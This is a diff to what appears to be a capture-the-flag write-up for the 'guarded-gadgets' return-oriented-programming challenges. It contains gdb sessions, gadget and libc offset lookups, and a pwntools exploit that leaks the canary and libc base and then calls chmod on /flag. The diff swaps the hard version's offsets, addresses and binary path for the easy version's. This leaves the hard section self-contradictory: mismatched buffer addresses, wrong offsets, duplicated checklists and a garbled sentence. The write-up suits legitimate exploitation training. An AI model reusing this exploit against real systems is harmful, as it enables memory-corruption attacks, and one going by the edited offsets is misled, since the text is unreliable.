@@ -11722,7 +11722,6 @@ We need the following:
 
 - [ ] Offset between buffer and stack canary 
 - [ ] Offset between buffer and stored return address to `main()`
-- [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
@@ -12011,7 +12010,6 @@ Breakpoint hit at 0x5e1c69bd94b3
    - Location of the buffer: `0x7ffe0e9228a0`
 - [ ] Offset between buffer and stored return address to `main()`
    - Location of the buffer: `0x7ffe0e9228a0`
-- [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
@@ -12041,7 +12039,6 @@ $2 = 88
 - [x] Offset between buffer and stored return address to `main()`: `88`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
-- [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
@@ -12068,7 +12065,6 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ ROPgadget --binary /l
 - [x] Offset between buffer and stored return address to `main()`: `88`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
-- [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
    - `pop rdi ; ret`: `0x23b6a`
@@ -12089,7 +12085,6 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
 - [x] Offset between buffer and stored return address to `main()`: `88`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
-- [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
 - [x] Locations of required ROP gadgets
@@ -12112,67 +12107,6 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
 - [x] Offset between buffer and stored return address to `main()`: `88`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
-- [ ] Location of a NULL terminated string
-- [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
-- [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x23b6a`
-   - `pop rsi ; ret`: `0x2601f`
-
-
-Let's find a relevant NULL terminated string.
-
-```
-hacker@return-oriented-programming~guarded-gadgets-easy:~$ objdump -s -j .rodata /challenge/guarded-gadgets-easy | grep -E "[0-9a-f]{2}00"
- 3000 01000200 00000000 2b2d2d2d 2d2d2d2d  ........+-------
- 3050 2d2d2d2d 2d2d2d2d 2d2b0044 61746120  ---------+.Data 
- 3070 79746573 29005374 61636b20 6c6f6361  ytes).Stack loca
- 3090 3373207c 20253138 73207c0a 00000000  3s | %18s |.....
- 30e0 78207c20 30782530 31366c78 207c0a00  x | 0x%016lx |..
- 3100 6c657220 6661696c 65642074 6f20696e  ler failed to in
- 3110 69746961 6c697a65 2e007c20 30782530  itialize..| 0x%0
- 3120 31366c78 3a200028 554e4d41 50504544  16lx: .(UNMAPPED
- 3140 20007265 74006361 6c6c0028 44495341   .ret.call.(DISA
- 3150 5353454d 424c5920 4552524f 52292000  SSEMBLY ERROR) .
- 3160 25303268 68782000 0a2b2d2d 2d205072  %02hhx ..+--- Pr
- 3190 61742025 702e0a00 23232300 23232320  at %p...###.### 
- 31a0 57656c63 6f6d6520 746f2025 73210a00  Welcome to %s!..
- 3200 726d2061 20524f50 20617474 61636b2e  rm a ROP attack.
- 3220 72696573 206f6600 6368616c 6c656e67  ries of.challeng
- 3280 616d6d69 6e67210a 00000000 00000000  amming!.........
- 3300 63616e20 646f2061 00000000 00000000  can do a........
- 3380 65722067 6f657300 746f206c 6962632c  er goes.to libc,
- 33f0 2077696c 6c206e65 65642074 6f000000   will need to...
- 3400 524f5020 66726f6d 20746865 72652e20  ROP from there. 
- 3470 2e205468 69730000 6d696768 74207461  . This..might ta
- 34c0 696f2e0a 00000000 41534c52 206d6561  io......ASLR mea
- 34f0 20697320 6e6f7420 6b6e6f77 6e2c0000   is not known,..
- 3500 62757420 49207769 6c6c2073 696d756c  but I will simul
- 3520 636c6f73 75726520 6f662069 742e0000  closure of it...
- 3560 656e6365 20646174 61000000 00000000  ence data.......
- 3580 6e746f20 74686520 73746163 6b2e0000  nto the stack...
- 35c0 696e2c00 00000000 62656361 75736520  in,.....because 
- 35f0 6e206164 64726573 7365732e 00000000  n addresses.....
- 3600 596f7520 63616e20 75736520 67616467  You can use gadg
- 3640 74686174 2e000000 5b4c4541 4b5d2059  that....[LEAK] Y
- 3670 25702e0a 0a000000 54686973 2077696c  %p......This wil
- 36c0 3a002570 005b4c45 414b5d20 2a257020  :.%p.[LEAK] *%p 
- 36d0 3d203078 25303136 6c6c780a 0a000000  = 0x%016llx.....
- 3700 7469616c 6c792025 64206761 64676574  tially %d gadget
- 3710 732e0a00 00000000 4c657427 73207461  s.......Let's ta
- 3770 20657865 63757461 626c6500 00000000   executable.....
- 37c0 2e004c65 6176696e 67210023 23232047  ..Leaving!.### G
- 37d0 6f6f6462 79652100                    oodbye!. 
-```
-
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
-- [x] Offset between buffer and stored return address to `main()`: `88`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
-- [ ] Location of a NULL terminated string: `0x37d6`
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
    - Offset of `chmod()` within Libc: `0x10dd80`
@@ -12511,7 +12445,7 @@ We need the following:
 ### Strategy
  
 Three problems to solve: canary, ASLR, and privilege. The trick is doing it in **two stages within the same process**, so ASLR is defeated for free on the second stage.
-Same as the [easy version](#strategy).
+Same the [easy version](#strategy).
 
 ### Binary analysis
 
@@ -12653,6 +12587,19 @@ Breakpoint hit at 0x641a475e0a4a
         fd: 0 (/dev/pts/1)
         buf: 0x7ffcf1340c70 ◂— 0
         nbytes: 0x1000
+ 
+   0x641a475e0a4f <main+361>    mov    dword ptr [rbp - 0xa4], eax
+   0x641a475e0a55 <main+367>    lea    rdi, [rip + 0x62b]              RDI => 0x641a475e1087 ◂— 'Leaving!'
+   0x641a475e0a5c <main+374>    call   puts@plt                    <puts@plt>
+ 
+   0x641a475e0a61 <main+379>    nop   
+   0x641a475e0a62 <main+380>    lea    rdi, [rip + 0x627]     RDI => 0x641a475e1090 ◂— '### Goodbye!'
+   0x641a475e0a69 <main+387>    call   puts@plt                    <puts@plt>
+ 
+   0x641a475e0a6e <main+392>    mov    eax, 0                       EAX => 0
+   0x641a475e0a73 <main+397>    mov    rcx, qword ptr [rbp - 8]
+   0x641a475e0a77 <main+401>    xor    rcx, qword ptr fs:[0x28]
+   0x641a475e0a80 <main+410>    je     main+417                    <main+417>
 ───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
 00:0000│ rsp 0x7ffcf1340c20 ◂— 0
 01:0008│-0c8 0x7ffcf1340c28 —▸ 0x7ffcf1340df8 —▸ 0x7ffcf1342ea3 ◂— 'SHELL=/run/dojo/bin/bash'
@@ -12697,15 +12644,17 @@ $2 = 136
 ```
 
 - [x] Offset between buffer and stack canary: `120`
-   - Location of the buffer: `0x7ffcf1340c70`
+   - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the canary: `0x7ffcf1340cf0 - 8` = `0x7ffcf1340ce8`
 - [x] Offset between buffer and stored return address to `main()`: `136`
-   - Location of the buffer: `0x7ffcf1340c70`
+   - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the stored return address to `main()`: `0x7ffcf1340cf8`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
 ### ROP gadgets
+
+We can look for the required ROP gadgets within Libc.
 
 ```
 hacker@return-oriented-programming~guarded-gadgets-hard:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
@@ -12715,16 +12664,16 @@ hacker@return-oriented-programming~guarded-gadgets-hard:~$ ROPgadget --binary /l
 ```
 
 ```
-hacker@return-oriented-programming~guarded-gadgets-hard:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rsi ; ret"
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rsi ; ret"
 0x000000000014b56c : cmp ecx, 0x3d8d48ff ; pop rsi ; ret
 0x000000000002601f : pop rsi ; ret
 ```
 
-- [x] Offset between buffer and stack canary: `120`
-   - Location of the buffer: `0x7ffcf1340c70`
-   - Location of the canary: `0x7ffcf1340ce8`
-- [x] Offset between buffer and stored return address to `main()`: `136`
-   - Location of the buffer: `0x7ffcf1340c70`
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffcf1340ce8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the stored return address to `main()`: `0x7ffcf1340cf8`
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
@@ -12733,24 +12682,53 @@ hacker@return-oriented-programming~guarded-gadgets-hard:~$ ROPgadget --binary /l
 
 ### Libc functions
 
+Let's first find the offset of `system()` within Libc from the base address of the Libc.
+
 ```
-hacker@return-oriented-programming~guarded-gadgets-hard:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
   1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
 ```
 
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffcf1340ce8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the stored return address to `main()`: `0x7ffcf1340cf8`
+- [ ] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x23b6a`
+   - `pop rsi ; ret`: `0x2601f`
+
+Now that we can calculate the Libc base address given the leak, let's find the offset of the `chmod()` function within Libc.
+
 ```
-hacker@return-oriented-programming~guarded-gadgets-hard:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
    125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
    631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
   1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
   2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
 ```
 
-- [x] Offset between buffer and stack canary: `120`
-   - Location of the buffer: `0x7ffcf1340c70`
-   - Location of the canary: `0x7ffcf1340ce8`
-- [x] Offset between buffer and stored return address to `main()`: `136`
-   - Location of the buffer: `0x7ffcf1340c70`
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffcf1340ce8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the stored return address to `main()`: `0x7ffcf1340cf8`
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x23b6a`
+   - `pop rsi ; ret`: `0x2601f`
+
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffcf1340ce8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the stored return address to `main()`: `0x7ffcf1340cf8`
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
@@ -12761,60 +12739,41 @@ hacker@return-oriented-programming~guarded-gadgets-hard:~$ readelf -s /lib/x86_6
 
 ### Leaking Libc base
 
-The binary doesn't print any libc addresses. However, the saved RIP sitting at `buf + 136` on the stack points into `__libc_start_main+243`, because that is who called `main()`. We use the arbitrary read primitive to fetch that 8-byte value directly.
+The binary doesn't print any libc addresses. However, the saved RIP sitting at `buf + 88` on the stack points into `__libc_start_main+243`, because that is who called `main()`. We use the arbitrary read primitive to fetch that 8-byte value directly.
 
-The saved RIP address comes from `info frame`:
-
-```
-pwndbg> info frame
- Saved registers:
-  rbp at 0x7ffcf1340cf0, rip at 0x7ffcf1340cf8
-```
-
-`buf + 136 = 0x7ffcf1340c70 + 136 = 0x7ffcf1340cf8` 
-
-The saved RIP value comes from the backtrace:
+From the backtrace:
 
 ```
-1   0x757e58b54083 __libc_start_main+243
+1   0x737019aac083 __libc_start_main+243
 ```
 
-Confirmed by reading it directly:
-
 ```
-pwndbg> x/gx 0x7ffcf1340cf8
-0x7ffcf1340cf8: 0x0000757e58b54083
+pwndbg> x/gx 0x7ffe0e9228f8
+0x7ffe0e9228f8: 0x0000737019aac083
 ```
 
-`__libc_start_main+243` is at libc offset `0x24083`, this is fixed for this libc version, derived from:
-
 ```
-pwndbg> p/x 0x757e58b54083 - 0x24083
-$3 = 0x757e58b30000   ← libc base (page-aligned )
+pwndbg> p/x 0x737019aac083 - 0x24083
+$3 = 0x737019a88000
 ```
 
-- Saved RIP address: `buf + 136 = 0x7ffcf1340cf8`
-- Saved RIP value: `0x757e58b54083`
-- `__libc_start_main+243` libc offset: `0x24083`
-- libc base: `0x757e58b54083 - 0x24083 = 0x757e58b30000`
+- Saved RIP: `0x737019aac083`
+- `__libc_start_main+243` is at libc offset `0x24083`
+- libc base: `0x737019aac083 - 0x24083 = 0x737019a88000`
 
 From there all function and gadget addresses follow:
 
 ```
-pop_rdi = 0x757e58b30000 + 0x23b6a = 0x757e58b53b6a
-pop_rsi = 0x757e58b30000 + 0x2601f = 0x757e58b5601f
-chmod   = 0x757e58b30000 + 0x10dd80 = 0x757e58c3dd80
+pop_rdi = 0x737019a88000 + 0x23b6a = 0x737019aab56a
+pop_rsi = 0x737019a88000 + 0x2601f = 0x737019aae01f
+chmod   = 0x737019a88000 + 0x10dd80 = 0x737019b95d80
 ```
 
 ### ROP chain
 
-The ROP chain is the same as the [easy challenge](#rop-chain-stage-2----leak-libc-base-chmod--0o777).
+The ROP chain would be the exact same as the [easy challenge](#rop-chain-2).
 
 ### Exploit
-
-```
-hacker@return-oriented-programming~guarded-gadgets-hard:~$ ln -sf /flag ~/!
-```
 
 ```py title="~/script.py" showLineNumbers
 from pwn import *
@@ -12836,20 +12795,20 @@ for attempt in range(200):
     nibble = attempt % 16
     restart_bytes = struct.pack('<H', (nibble * 0x1000 + TARGET_LOW16) & 0xFFFF)
 
-    p = process('/challenge/guarded-gadgets-hard')
+    p = process('/challenge/guarded-gadgets-easy')
     try:
         # --- STAGE 1: Leak canary, 2-byte partial overwrite → restart main() ---
         p.recvuntil(b'located at: ')
         buf = int(p.recvline().strip().rstrip(b'.'), 16)
 
-        # Leak canary at buf + 120
+        # Leak canary at buf + 72
         p.recvuntil(b'Address in hex to read from:')
-        p.sendline(hex(buf + 120).encode())
+        p.sendline(hex(buf + 72).encode())
         p.recvuntil(b' = 0x')
         canary = int(p.recvline().strip(), 16)
 
         # Overwrite low 2 bytes of saved RIP → __libc_start_main+0x69 (calls main)
-        p.send(b'A' * 120 + p64(canary) + b'B' * 8 + restart_bytes)
+        p.send(b'A' * 72 + p64(canary) + b'B' * 8 + restart_bytes)
 
         try:
             p.recvuntil(b'located at: ', timeout=2)
@@ -12860,9 +12819,9 @@ for attempt in range(200):
         # --- STAGE 2: Leak libc base via saved RIP, send chmod ROP chain ---
         buf2 = int(p.recvline().strip().rstrip(b'.'), 16)
 
-        # Leak saved RIP at buf + 136 → __libc_start_main+243 → libc base
+        # Leak saved RIP at buf + 88 → __libc_start_main+243 → libc base
         p.recvuntil(b'Address in hex to read from:')
-        p.sendline(hex(buf2 + 136).encode())
+        p.sendline(hex(buf2 + 88).encode())
         p.recvuntil(b' = 0x')
         libc_base = int(p.recvline().strip(), 16) - LSM_243_OFF
 
@@ -12878,7 +12837,7 @@ for attempt in range(200):
         # Write "!\x00" at buf2 so buf2 itself is a valid path string for chmod.
         # ~/! is a symlink to /flag, so chmod("!", 0o777) makes /flag world-readable.
         payload = flat(
-            b'!\x00' + b'A' * 118,  # "!\x00" at buf2, pad to canary
+            b'!\x00' + b'A' * 70,   # "!\x00" at buf2, pad to canary
             p64(canary),
             p64(0),                  # saved RBP
 
@@ -12907,12 +12866,15 @@ for attempt in range(200):
 ```
 
 ```
+hacker@return-oriented-programming~guarded-gadgets-hard:~$ ln -sf /flag ~/!
+```
+
+```
 hacker@return-oriented-programming~guarded-gadgets-hard:~$ python ~/script.py
 pwn.college{cuAFnOlGqi0aaNd1OJwtlLU09th.0lN2MDL4ITM0EzW}
 ```
 
 &nbsp;
-
 ## ROP Roulette (Easy)
 
 ```
